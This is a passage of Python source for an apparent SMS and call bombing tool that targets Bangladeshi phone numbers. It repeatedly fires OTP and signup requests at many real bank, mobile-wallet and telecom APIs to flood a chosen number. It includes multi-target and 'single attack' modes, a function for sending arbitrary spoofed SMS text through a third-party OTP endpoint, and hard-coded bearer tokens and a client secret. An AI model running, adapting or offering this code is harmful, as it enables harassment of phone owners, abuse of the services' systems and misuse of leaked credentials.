        #     requ_nbl_server = requests.post(url_nbl, headers=headers_nbl, data=data_nbl)
        #     if requ_nbl_server.json()["message"] == "OTP Sended successfully.":
        #         i += 1
        #         print_text = "[" + str(i) + "]"
        #         sys.stdout.write(print_text)
        #         sys.stdout.flush()
        #         sys.stdout.write("\b" * len(print_text))
        #         if i == amount:
        #             print("[" + str(i) + "]")
        #             fb()
        #             break
        #         else:
        #             pass
        #     else:
        #         pass
        # except:
        #     pass
        # # Dmoney
        try:
            url_token = "https://api.dmoney.com.bd:3033/Dmoney/Token"
            headers_token = {"Authorization": "Basic, E8xlkWsSjZKBZ8yQ6VjaQIUM9tUfo/bPdrOy+BATiwc=",
                             "Content-Type": "application/x-www-form-urlencoded",
                             "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; A5010 Build/N2G48H)",
                             "Host": "api.dmoney.com.bd:3033",
                             "Connection": "close",
                             "Accept-Encoding": "gzip, deflate",
                             "Content-Length": "20"}
            data_token = "grant_type=password&="
            resp_token = requests.post(url_token, headers=headers_token, data=data_token)

            url_dmoney = "https://api.dmoney.com.bd:3033/DmoneyPlatform/um_customer_create"
            headers_dmoney = {
            "productCode" : "DM",
            "Authorization" : "bearer " + resp_token.json()["access_token"],
            "accept-language" : "en",
            "Content-Type" : "application/json",
            "User-Agent" : "Dalvik/2.1.0 (Linux; U; Android 7.1.2; A5010 Build/N2G48H)",
            "Host" : "api.dmoney.com.bd:3033",
            "Connection" : "close",
            "Accept-Encoding" : "gzip, deflate",
            "Content-Length" : "638"}
            data_dmoney = '{"clientType":"dmoney-customer-wallet","dateOfBirth":"04\/11\/1996","email":"aru1234@yahoo.com","fullName":"ARU","mobileNumber":"'+number+'","operatorCode":"3","pin":"qLg\/BH8nl1IzjzVtgPx8mQ==","pinHMac":"mwUD43\/XYDBN4gs0fMQxtBJqVGSod2NZRlUvq6QnN4E=","referralCode":"","userType":"5","deviceName":"OnePlus A5010 Android 7.1.2","deviceNumber":"e57cd87b2c9b47b1","hardwareSignature":"20ad24ea74d4efdbf96413fb97f428cd6227f157610655ebeeb6c87d2b8bbd9bbdd0a343b4ba09ddda9b69de8bf5770edb618e3820bf0ff7fb8d777612a7f0f1","mobileAppVersion":"2.2.2_DM","mobileAppVersionCode":53,"productCode":"DM","requestId":"42EE607762F2F08A","sessionToken":""}'
            requ_dmoney_server = requests.post(url_dmoney, headers=headers_dmoney, data=data_dmoney)
            if requ_dmoney_server.status_code == 200:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # # Bikroy
        try:
            url_bikroy = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=" + number
            requ_bikroy_server = requests.get(url_bikroy)
            if requ_bikroy_server.json()["otp_length"] == 6:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()

                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # # WEB ONE
        try:
            url_web_one = "http://27.131.15.19/lstyle/api/lsotprequest"
            headers_web_one = {"Content-Type": "application/json"}
            data_web_one = '{"shortcode":"2494905","msisdn":"88' + number + '"}'
            requ_web_one_server = requests.post(url_web_one, headers=headers_web_one, data=data_web_one)
            if requ_web_one_server.json()["reponse"] == "SUCCESSFUL":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # # # Two
        try:
            url_web_two = "http://27.131.15.19:80/lstyle/api/lsotprequest"
            headers_web_two = {"Content-Type": "application/json"}
            data_web_two = '{"shortcode":"2494905","msisdn":"88' + number + '"}'
            requ_web_two_server = requests.post(url_web_two, headers=headers_web_two, data=data_web_two)
            if requ_web_two_server.json()["reponse"] == "SUCCESSFUL":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass

        # My DRIVE
        try:
            url_drive = "https://www.mydrivebd.com/sapi/profile?action=signup&notify=true&rid=0.14346360928321888"

            headers_drive = {"Host": "www.mydrivebd.com",
                             "content-length": "126",
                             "x-deviceid": "web-08474b7fff1202e709e8935c10cf5ca3",
                             "content-type": "application/json;charset=UTF-8",
                             "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; vivo Y85) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
                             "accept": "*/*",
                             "origin": "https://www.mydrivebd.com",
                             "sec-fetch-site": "same-origin",
                             "sec-fetch-mode": "cors",
                             "sec-fetch-dest": "empty",
                             "referer": "https://www.mydrivebd.com/",
                             "accept-encoding": "gzip, deflate, br",
                             "accept-language": "en-US,en;q=0.9",
                             "cookie": "JSESSIONID=0E317BDBE17C4F72F27F47F3047D50FE.1i164",
                             "cookie": "loginRetriesLeft=5",
                             "cookie": "loginRetriesLeft_Date=%3B%20expires%3DTue%2C%2027%20Sep%202022%2021%3A39%3A57%20GMT",
                             "cookie": "cookiesAccepted=true",
                             "cookie": "_ga_G32R4HEST2=GS1.1.1664228417.1.0.1664228417.0.0.0",
                             "cookie": "_ga=GA1.1.1935620814.1664228418"}
            data_drive = '{"data":{"user":{"generic":{"userid":"88' + number + '","password":"' + ''.join(
                random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in
                range(15)) + '","l10n":"en","acceptedtermsandconditions":true}}}}'
            requ_drive_server = requests.post(url_drive, headers=headers_drive, data=data_drive)
            if requ_drive_server.status_code == 200:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # LAnka Bangla 1
        try:
            url_lanka = "https://napi.dmoney.com.bd:6066/DmoneyPlatform/um_public_ekyc_checkMobileEmail"
            headers_lanka = {"productCode": "FS",
                            "Authorization": "bearer 9gp0IvDK_5DX1StqaF4__rHnboeHCwayrMsdZ3aNGhoF1jykX7xyoQBASWnSTbnZ5NmMXDinOBhI4rjy-0mXcoPUsFu7Xbdga-sy3TunDsxToMzLqn-zB_3Opi7FbHOLU47kQFLzkPdF8_QADX9eC3Sy-j9IBH5JnoSvL4YADKZic6D_Ok8j7zwfWy3kcXKRgyFje5ft0s-5ztXWGUy-6YOGdbThWoy6LBbK_Yr3Ek8YYGi6",
                            "accept-language": "en", "Content-Type": "application/json",
                            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/N2G48H)",
                            "Host": "napi.dmoney.com.bd:6066", "Connection": "Keep-Alive", "Accept-Encoding": "gzip",
                            "Content-Length": "493"}
            data_lanka = '{"ekycApplicationData":{"emailId":"mr_kille@yahoo.com","id":0,"mobileNumber":"' + number + '","productCode":"FS"},"channel":"ANDROID_APP","deviceName":"Asus ASUS_Z01QD Android 7.1.2","deviceNumber":"751405a75d71e619","hardwareSignature":"14879d1fcce97c13dd673ee7ce6d7f1c69f56f8880c2d2326f675473472c1dcefb603902376020fc0a75d8a3868a84ebb5c1211abe38c75583d412783bbfcb40","mobileAppVersion":"4.1.1_RELEASE","mobileAppVersionCode":37,"productCode":"FS","requestId":"2015BDC18305FBFB","sessionToken":""}'
            requ_lanka_server = requests.post(url_lanka, headers=headers_lanka, data=data_lanka)
            if requ_lanka_server.json()['status'] == 200 and requ_lanka_server.json()['errors'] == None:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # # TAP
        try:
            ID = uuid.uuid4()
            url_tap = "https://api.bdkepler.com/api_middleware-0.0.2-RELEASE/registration-generate-otp"
            headers_tap = {"Content-Type":"application/json"}
            data_tap = '{"deviceId":"'+str(ID)+'","operator":"Robi","walletNumber":"'+number+'"}'
            requ_tap_server = requests.post(url_tap, headers=headers_tap, data=data_tap)
            if requ_tap_server.status_code == 200 and requ_tap_server.json()['statusCode'] == 200:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()

                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # # KIri Shop
        try:
            url_monach = "https://retailer.ifarmer.asia/api/v1/retailers/sign_up"
            headers_monach = {"Content-Type": "application/x-www-form-urlencoded"}
            data_monach = 'phone=%2B88'+number
            requ_monach_server = requests.post(url_monach, headers=headers_monach, data=data_monach)
            if requ_monach_server.status_code == 201:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()

                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # madhumati
        try:
            url_madhumati = "https://mmbl-eaccount.modhumotibank.net/api/otp-request"
            headers_madhumati = {"Content-Type" : "application/json"}
            data_madhumati = '{"mobile":"'+number+'"}'
            requ_madhumati_server = requests.post(url_madhumati, headers=headers_madhumati, data=data_madhumati)
            if requ_madhumati_server.json()["message"] == "OTP Sended successfully.":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()

                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
                pass
        # uttara
        try:
            url_uttara = "https://ibanking.uttarabank-bd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber"
            headers_uttara = {"Content-Type" : "application/json"}
            data_uttara = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"111","requestChannel":"MOB","trackingStatus":5}'
            requ_uttara_server = requests.post(url_uttara, headers=headers_uttara, data=data_uttara)
            if requ_uttara_server.json()["message"] == "OTP Generated":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()

                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # midland
        try:
            url_midland = "https://direct.midlandbankbd.net/selfekyc/api/Enrollment"
            headers_midland = {"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Dalvik/2.1.0 (Linux; U; Android 7.1.2; A5010 Build/N2G48H)","Host":"direct.midlandbankbd.net","Connection":"close","Accept-Encoding":"gzip, deflate","Content-Length":"194"}
            data_midland = "email=fuckyou%40yahoo.com&channel=A&mobile="+number+"&accesskey=25418d3c2fae43648b99aedd33386d803dda43e9c15e0628eb1177a2fda93335a8cd001d6bdcb3cef7881ccd3b8cba3278d308b925ae4df634b480974ca07d21&"
            requ_midland_server = requests.post(url_midland, headers=headers_midland, data=data_midland)
            if requ_midland_server.status_code == 200:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()

                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass

        # nrb
        try:
            url_nrb = "https://www.nrbbankbd.com/online-application/account/upload.php?action=login"
            headers_nrb = {"Content-Type":"application/x-www-form-urlencoded"}
            data_nrb = "applicant_email=fuckYou@yahoo.com&applicant_mobile="+number+"&proceed=Proceed"
            requ_nrb_server = requests.post(url_nrb, headers=headers_nrb, data=data_nrb)
            if requ_nrb_server.text == "true":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()

                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # lanka
        try:
            url_lanka_bn2 = "https://www.lankabangla.com/personal-loan-application/upload.php?action=login"
            headers_lanka_bn2 = {"Content-Type":"application/x-www-form-urlencoded"}
            data_lanka_bn2 = "applicant_email=fuckYou@yahoo.com&applicant_mobile="+number+"&proceed=Proceed"
            requ_lanka_bn2_server = requests.post(url_lanka_bn2, headers=headers_lanka_bn2, data=data_lanka_bn2)
            if requ_lanka_bn2_server.text == "true":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()

                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # Sahjalal
        try:
            url_sahjalal = "https://eaccount.sjiblbd.com/VerifIDEXT/api/CustOnBoarding/VerifyMobileNumber"
            headers_sahjalal = {"Content-Type": "application/json",}
            data_sahjalal = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"121","requestChannel":"MOB","trackingStatus":5}'
            requ_sahjalal_server = requests.post(url_sahjalal, headers=headers_sahjalal, data=data_sahjalal)
            if requ_sahjalal_server.json()['message'] == 'OTP Generated':
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # EBL
        try:
            url_ebl = "https://insta.ebl-bd.com/eblEkyc/postRegistration;jsessionid=iZVEPUNNbCH68x3Hn22jwThCQK0zqBNKkaMs2jx-w1vfaGGQonBb!-1086432445"
            headers_ebl = {"Content-Type":"application/x-www-form-urlencoded"}
            data_ebl = "vcCustName=Pudina&vcCustEmail=Fuck%40gmail.com&vcCustMob="+number+"&vcPassword=12345678&confirmPassword=12345678"
            requ_ebl_server = requests.post(url_ebl, headers=headers_ebl, data=data_ebl)
            if requ_ebl_server.status_code == 200:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
















def my_gp():
    global operator
    clr()
    banner_premium()
    option_gp = '''
    [1] GPAY
    [2] GP MUSIC
'''
    printchar(random.choice(colorArr)+option_gp,0.01)
    inputConnectOptionGP = str(input(f"  {random.choice(colorArr)}  CHOOSE A OPTION: {random.choice(colorArr)}"))
    if inputConnectOptionGP == '01' or inputConnectOptionGP == '1':
        clr()
        banner_premium()
        def inValid():
            global number, country_valid, amount
            number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))
            amount = int(input(f"  {random.choice(colorArr)}  ENTER AMOUNT [UNLIMITED]: {random.choice(colorArr)}"))
            country_valid = number[:3]
        inValid()
        if number == "":
            printchar(f"{red}    EMPTY INPUT", 0.05)
            time.sleep(2)
            my_gp()
        if amount == "":
            printchar(f"{red}    EMPTY INPUT", 0.05)
            time.sleep(2)
            my_gp()
        elif len(number) != 11:
            printchar(f"{red}    WRONG NUMBER", 0.05)
            time.sleep(2)
            my_gp()
        else:
            if country_valid == grameenohone:
                operator = "GrameenPhone"
            elif country_valid == grameenohone_miror:
                operator = "GrameenPhone"
            else:
                printchar(f"{red}    INVALID OPERATOR", 0.05)
                time.sleep(2)
                my_gp()
            if amount != '':
                if number in numbers:
                    printchar(f"{red}    PROTECTED NUMBER", 0.05)
                    sys.exit()
                else:
                    try:
                        url = "https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup"
                        headers = {'Accept': 'application/json', 'Content-Type': 'application/json; charset=utf-8',
                                   'Accept-Encoding': 'gzip, deflate', 'User-Agent': 'okhttp/4.9.1'}
                        data = '{"deviceId":"' + str(random.randint(10000000000000000,99999999999999999)) + '","msisdn":"' + number + '","tran_type":"OTPREQSIGNUP"}'
                        requ = requests.post(url, data=data, headers=headers)
                        if requ.json()['message'] == "You already have GPAY wallet. If you forget PIN, please call 21200 for help.":
                                url = "https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignin"
                        else:
                            url = url
                        phone = "+88" + number
                        getIPjson = requests.get("http://ip-api.com/json/")
                        ip = getIPjson.json()['query']
                        infoC = random.choice(colorArr)
                        bombInfo = (f'{infoC}\n'
                                    f'     ══════════════════════════════════════\n'
                                    f'     {random.choice(colorArr)}  PHONE : {random.choice(colorArr)}{phone}       \n'
                                    f'     {random.choice(colorArr)}  BOMBING AMOUNT : {random.choice(colorArr)}{amount}        \n'
                                    f'     {random.choice(colorArr)}  YOUR IP : {random.choice(colorArr)}{ip} \n'
                                    f'     {random.choice(colorArr)}  OPERATOR : {random.choice(colorArr)}{operator}\n'
                                    f'     {infoC}══════════════════════════════════════\n'
                                    f'    ')
                        clr()
                        banner_premium()
                        print(bombInfo)
                        i = 0
                        print(f"{greenBold}   TOTAL SMS REQUESTS SENT: {cyanBold}", end="")
                        while i < amount:
                                data = '{"deviceId":"' + str(random.randint(10000000000000000,99999999999999999)) + '","msisdn":"' + number + '","tran_type":"OTPREQSIGNUP"}'
                                requ = requests.post(url, data=data, headers=headers)
                                if requ.json()["message"] == "OTP is required to sign in, Please check sms":
                                    i += 1
                                    print_text = "[" + str(i) + "]"
                                    sys.stdout.write(print_text)
                                    sys.stdout.flush()

                                    sys.stdout.write("\b" * len(print_text))
                                    if i == amount:
                                        print("[" + str(i) + "]")
                                        fb()
                                        break
                                    else:
                                        pass
                                else:
                                    printchar(f"{red}    API DEAD", 0.05)
                    except:
                        pass
            else:
                printchar(f"{red}    WRONG AMOUNT", 0.05)
                my_gp()
    # ghp music
    elif inputConnectOptionGP == '02' or inputConnectOptionGP == '2':
        clr()
        banner_premium()
        def inValid():
            global number, country_valid, amount
            number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))
            amount = int(input(f"  {random.choice(colorArr)}  ENTER AMOUNT [UNLIMITED]: {random.choice(colorArr)}"))
            country_valid = number[:3]
        inValid()
        if number == "":
            printchar(f"{red}    EMPTY INPUT", 0.05)
            time.sleep(2)
            my_gp()
        if amount == "":
            printchar(f"{red}    EMPTY INPUT", 0.05)
            time.sleep(2)
            my_gp()
        elif len(number) != 11:
            printchar(f"{red}    WRONG NUMBER", 0.05)
            time.sleep(2)
            my_gp()
        else:
            if country_valid == grameenohone:
                operator = "GrameenPhone"
            elif country_valid == grameenohone_miror:
                operator = "GrameenPhone"
            else:
                printchar(f"{red}    INVALID OPERATOR", 0.05)
                time.sleep(2)
                my_gp()
            if amount != '':
                if number in numbers:
                    printchar(f"{red}    PROTECTED NUMBER", 0.05)
                    sys.exit()
                else:
                    try:
                        try:
                            url_t = "https://api.gpmusic.co/v2/oauth2/token"
                            headers_t = {'Content-Type': 'application/x-www-form-urlencoded'}
                            data_t = "client_secret=a41e79d013c550229421d7adedeb501b2a9f8240&client_id=8ee9eb276be94a6abc50077d8ef1b4d7&grant_type=client_credentials"
                            get_t = requests.post(url_t, data=data_t, headers=headers_t)
                            token = get_t.json()["access_token"]
                            url = "https://api.gpmusic.co/v2/codes"
                            headers = {
                                'User-Agent': 'Gp/4.5.4 BeatSDK/4.4.8 Dalvik/2.1.0 (Linux;Android 7.1.2; A5010 Build/uboot)',
                                'Authorization': 'Bearer ' + token,
                                'X-Country': 'bd',
                                'Content-Type': 'application/json; charset=utf-8'}
                            data = '{"msisdn":"88'+number+'"}'
                            url_c = 'https://api.gpmusic.co/v2/users'
                            c = requests.post(url_c, data=data, headers=headers)
                        except:
                            printchar(f'{redBold}    NO INTERNET', 0.01)
                        phone = "+88" + number
                        getIPjson = requests.get("http://ip-api.com/json/")
                        ip = getIPjson.json()['query']
                        infoC = random.choice(colorArr)
                        bombInfo = (f'{infoC}\n'
                                    f'     ══════════════════════════════════════\n'
                                    f'     {random.choice(colorArr)}  PHONE : {random.choice(colorArr)}{phone}       \n'
                                    f'     {random.choice(colorArr)}  BOMBING AMOUNT : {random.choice(colorArr)}{amount}        \n'
                                    f'     {random.choice(colorArr)}  YOUR IP : {random.choice(colorArr)}{ip} \n'
                                    f'     {random.choice(colorArr)}  OPERATOR : {random.choice(colorArr)}{operator}\n'
                                    f'     {infoC}══════════════════════════════════════\n'
                                    f'    ')
                        clr()
                        banner_premium()
                        print(bombInfo)
                        i = 0
                        print(f"{greenBold}   TOTAL SMS REQUESTS SENT: {cyanBold}", end="")
                        while i < amount:
                            requ = requests.post(url, data=data, headers=headers)
                            if requ.json() == {}:
                                i += 1
                                print_text = "[" + str(i) + "]"
                                sys.stdout.write(print_text)
                                sys.stdout.flush()

                                sys.stdout.write("\b" * len(print_text))
                                if i == amount:
                                    print("[" + str(i) + "]")
                                    fb()
                                    break
                                else:
                                    pass
                            else:
                                printchar(f"{red}    API DEAD", 0.05)
                    except:
                        pass
            else:
                printchar(f"{red}    WRONG AMOUNT", 0.05)
                my_gp()
    else:
        printchar(f"{red}    INVALID INPUT", 0.05)
        time.sleep(2)
        my_gp()
def call_bomb():
    clr()
    banner_premium()
    number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))
    amount = int(input(f"  {random.choice(colorArr)}  ENTER AMOUNT[MAX 10]: {random.choice(colorArr)}"))
    time.sleep(3)
    if len(number) == 11:
        if amount <= 10:
            if number in ['01843448308', '01832116637']:
                printchar(f'{redBold}    FUCK YOU BRO', 0.01)
                sys.exit()
            else:
                i=0
                while i < amount:
                    try:
                        url_1 = "https://www.gntloanonline.online/api/bd_gntloanonline/s1818VYnIziUwS4?lang=en"
                        headers_1 = {
                        "Accept":"application/json, text/javascript, */*; q=0.01",
                        "Origin":"file://",
                        "User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; A5010 Build/N2G48H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.70 Mobile Safari/537.36 Html5Plus/1.0",
                        "Content-Type":"application/x-www-form-urlencoded",
                        "Accept-Encoding":"gzip, deflate",
                        "Accept-Language":"en-US",
                        "X-Requested-With":"gnt.pykwjbtwdgwc"
                        }
                        data_1 = "mobile=" + number + "&prefix=00880"
                        resp_1 = requests.post(url_1, headers=headers_1, data=data_1)
                        print(json.dumps(json.loads(resp_1.text), indent=1))
                        time.sleep(60)
                        if amount == i:
                            break
                        else:
                            pass
                    except Exception as error:
                        print(error)
                        pass
                    try:
                        url_2 = "https://www.onlyioucreditloan.xyz/api/bd_onlyioucreditloan/rD6yV21uAjI5?lang=en"
                        headers_2 = {
                                "Accept": "application/json, text/javascript, */*; q=0.01",
                                "Origin": "file://",
                                "User-Agent": "Mozilla/5.0 (Linux; Android 7.1.2; A5010 Build/N2G48H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.70 Mobile Safari/537.36 Html5Plus/1.0",
                                "Content-Type": "application/x-www-form-urlencoded",
                                "Accept-Encoding": "gzip, deflate",
                                "Accept-Language": "en-US",
                                "X-Requested-With": "oimj.mjdkob714tcgp"
                            }
                        data_2 = "mobile=" + number + "&prefix=00880"
                        resp_2 = requests.post(url_2, headers=headers_2, data=data_2)
                        print(json.dumps(json.loads(resp_2.text), indent=1))
                        time.sleep(60)
                        if amount == i:
                            break
                        else:
                            pass
                    except Exception as error:
                        print(error)
                        pass
                    try:
                        url_3 = "https://api.phandora.xyz/phandora/v2/ziRkl6CgTw%2FSmWGFMgO%2Bjt7n14Q1FonYq0%2Ft4QPHWgE%3D"
                        headers_3 = {
                        "Appcode":"Phandora",
                        "Content-Type":"application/json",
                        "Accept-Encoding":"gzip, deflate",
                        "User-Agent":"okhttp/5.0.0-alpha.2"}
                        data_3 = '{"mobile":"'+number+'","appCode":"Phandora"}'
                        resp_3 = requests.post(url_3, headers=headers_3, data=data_3)
                        print(json.dumps(json.loads(resp_3.text), indent=1))
                        time.sleep(60)
                        if amount == i:
                            break
                        else:
                            pass
                    except Exception as error:
                        print(error)
                        pass
                    try:
                        url_4 = "https://www.billieln.xyz/billieln/v2/xJIvyxB8Isw1cLbNgQUcelbKwg2ezUFVT9us1vyILqY%3D"
                        headers_4 = {
                        "Appcode":"BillieLN",
                        "Content-Type":"application/json",
                        "Accept-Encoding":"gzip, deflate",
                        "User-Agent":"okhttp/5.0.0-alpha.2"}
                        data_4 = '{"mobile":"'+number+'","appCode":"BillieLN"}'
                        resp_4 = requests.post(url_4, headers=headers_4, data=data_4)
                        print(json.dumps(json.loads(resp_4.text), indent=1))
                        time.sleep(60)
                        if amount == i:
                            break
                        else:
                            pass
                    except Exception as error:
                        print(error)
                        pass
        else:
            printchar(f'{redBold}    WRONG AMOUNT', 0.01)
    else:
        printchar(f'{redBold}    PLEASE ENTER VALID NUMBER',0.01)

def circle():
    try:
        from circle import robicircle
    except:
        os.system('pip install circlerobi')
        pass
    clr()
    banner_premium()
    number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))
    while True:
        robicircle.requforapi(number)
        time.sleep(1)
def custom():
    clr()
    banner_premium()
    number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))
    message = str(input(f"  {random.choice(colorArr)}  ENTER MESSAGE: {random.choice(colorArr)}"))
    if len(number) != 11:
        printchar(f'{redBold}    NUMBER INVALID', 0.01)
    elif len(message) <= 140:
        import requests
        from requests.structures import CaseInsensitiveDict
        url = "https://api.bonikapp.com/otp/sendOtp"
        headers = CaseInsensitiveDict()
        headers["Content-Type"] = "application/json"
        data = '{"phone_number":"'+number+'","text":"'+message+'"}'
        resp = requests.post(url, headers=headers, data=data)
        if resp.json()['status'] == 'SUCCESS':
            printchar(f'{greenBold}    SMS SENT.', 0.01)
            againOrExit = input(f'{whiteBold}    Sent another message(Y/N){blueBold} ')
            if againOrExit.lower() == 'y':
                custom()
            else:
                sys.exit()
        else:
            printchar(f'{redBold}    SMS NOT SENT.', 0.01)
    else:
        printchar(f'{redBold}    MESSAGE SO LARGE', 0.01)
def single_attack():
    option_single = f'''{random.choice(colorArr)}
    [1] PADMA BANK
    [2] BD FINANCE
    [3] UPAI 
    [4] MADICO
    ''' + end
    banner_premium()
    printchar(option_single,0.01)
    op = str(input(f"  {random.choice(colorArr)}  CHOSSE A OPTION: {random.choice(colorArr)}"))
    if op == '01' or op == '1':
        banner_premium()
        number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))

        if number in numbers:
            printchar(f"{redBold}    PROTECTED NUMBER", 0.05)
        else:
            i=0
            while True:
                try:
                    import requests
                    from requests.structures import CaseInsensitiveDict
                    url = "https://116.212.111.165/api/otp-request"
                    headers = CaseInsensitiveDict()
                    headers["Content-Type"] = "application/json"
                    data = '{"mobile":"'+number+'"}'
                    resp = requests.post(url, headers=headers, data=data, verify=False)
                    print(random.choice(colorArr) + resp.text)
                except Exception as e:
                    print(e)
                    pass
    elif op == '02' or op == '2':
        banner_premium()
        number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))
        if number in numbers:
            printchar(f"{redBold}    PROTECTED NUMBER", 0.05)
        else:
            i=0
            while True:
                try:
                    import requests
                    from requests.structures import CaseInsensitiveDict
                    url = "https://120.50.19.226:9515/VerifIDEXT/api/CustOnBoarding/VerifyMobileNumber"
                    headers = CaseInsensitiveDict()
                    headers["Content-Type"] = "application/json"
                    data = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number+'","otpSms":"","product_id":"230","requestChannel":"MOB","trackingStatus":5}'
                    resp = requests.post(url, headers=headers, data=data, verify=False)
                    print(random.choice(colorArr) + resp.text)
                except Exception as e:
                    print(e)
                    pass

    elif op == '03' or op == '3':
        banner_premium()
        number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))
        if number in numbers:
            printchar(f"{redBold}    PROTECTED NUMBER", 0.05)
            sys.exit()
        else:
            upai(number)
    elif op == '04' or op == '4':
        banner_premium()
        number = str(input(f"  {random.choice(colorArr)}  ENTER NUMBER: {random.choice(colorArr)}"))
        if number in numbers:
            printchar(f"{redBold}    PROTECTED NUMBER", 0.05)
            sys.exit()
        else:
            madico(number)
    else:
        single_attack()
def multi_attack():
    banner_premium()
    number_mu = str(input(f"  {random.choice(colorArr)}  ENTER NUMBERS [use space to separate number]: {random.choice(colorArr)}"))
    numbers_all = str.split(number_mu)
    banner_premium()
    i=0
    number_mul = []

    for num in numbers_all:
        if num in numbers:
            i += 1
            printchar(f"{greenBold}    NUMBER{str(i)}: {cyanBold}+88{num} {redBold}[PROTECTED NUMBER]{end}", 0.01)
            pass
        else:
            i += 1
            printchar(f"{greenBold}    NUMBER{str(i)}: {cyanBold}+88{num} ", 0.01)
            number_mul.append(num)
    number_multi = ' '.join(str(x) for x in number_mul)

    while True:
        print("\n")
        att(number_multi)
def att(number_multi):
    numbers_all = str.split(number_multi)
    if len(numbers_all) == 0:
        sys.exit()
    else:
        pass
    for num in numbers_all:
        # NESCO
        try:
            url_nesco = "http://nesco.sslwireless.com/api/v1/login"
            headers_nesco = {"Content-Type": "application/x-www-form-urlencoded"}
            data_nesco = "phone_number=" + num
